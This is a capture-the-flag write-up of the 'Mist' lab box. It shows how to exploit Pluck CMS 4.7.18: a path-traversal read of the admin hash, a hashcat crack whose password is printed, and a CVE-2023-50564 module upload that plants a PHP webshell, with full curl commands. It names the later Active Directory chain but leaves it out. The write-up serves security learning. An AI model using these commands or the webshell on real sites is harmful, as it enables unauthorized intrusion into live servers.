## Overview

Mist is an insane-difficulty Windows box fronted by a Pluck CMS 4.7.18 site on Apache. A path-traversal file read in the albums module leaks the admin password hash; cracking it grants the admin panel, and the module-install feature (CVE-2023-50564) unzips a PHP webshell for remote code execution as `svc_web`. This post covers recon through the initial foothold — everything past the web shell is a deep Active Directory chain left out of the public writeup.

CVE-driven foothold: a Pluck albums path-traversal hash read plus the authenticated module-installer CVE-2023-50564 webshell upload is the whole public path; mostly point-and-click.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 80   | HTTP — Apache 2.4.52 (Win64) PHP/8.1.1 | Pluck CMS 4.7.18, `http-generator: pluck 4.7.18` |

Only port 80 is exposed externally. The server header and generator meta both confirm Pluck 4.7.18 — a version with public vulnerabilities. The site redirects to `?file=mist` and requires the `mist.htb` vhost.

```bash
nmap -p- --min-rate=1000 -T4 10.129.231.20
nmap -p80 -sC -sV 10.129.231.20
echo "10.129.231.20 mist.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Pluck 4.7.18's `albums_getimage.php` takes an `?image=` parameter and returns the file without verifying it is actually an image, allowing arbitrary file read under the albums path. The `admin_backup.php` file there holds the admin password as a SHA-512 hash.

```bash
curl -s "http://mist.htb/data/modules/albums/albums_getimage.php?image=admin_backup.php"
# <?php $ww = 'c81dde78...265ce81e'; ?>
```

The hash cracks with rockyou:

```bash
hashcat -m 1700 hash.txt /usr/share/wordlists/rockyou.txt
# c81dde78...265ce81e:lexypoo97
```

## Foothold

Pluck's login asks only for a password. With `lexypoo97` we reach the admin panel, where the "install a module" feature unzips an uploaded archive straight into the web root — CVE-2023-50564. Packaging a PHP webshell inside a directory and uploading it yields code execution.

```bash
curl -s -c cj.txt -d 'cont1=lexypoo97&bogus=&submit=Login' "http://mist.htb/login.php"
mkdir shell && printf '<?php system($_REQUEST["cmd"]); ?>' > shell/shell.php
zip -r shell.zip shell
curl -s -b cj.txt -F "sendfile=@shell.zip;type=application/zip" -F "submit=Install" "http://mist.htb/admin.php?action=installmodule"
curl -s "http://mist.htb/data/modules/shell/shell.php?cmd=whoami"
# ms01\svc_web
```

The webshell runs from `C:\xampp\htdocs\...`, giving command execution as `svc_web` on MS01.

## User flag

From the `svc_web` foothold, reaching `user.txt` requires a multi-stage Active Directory chain (shortcut hijacking, certificate-template abuse, an NTLM relay over WebDAV, and shadow credentials) — intentionally omitted here.

```bash
type C:\Users\Administrator\Desktop\user.txt   # HTB{...}
```

The Active Directory privilege chain to user and root is left as an exercise — this post stops at the public-facing foothold.
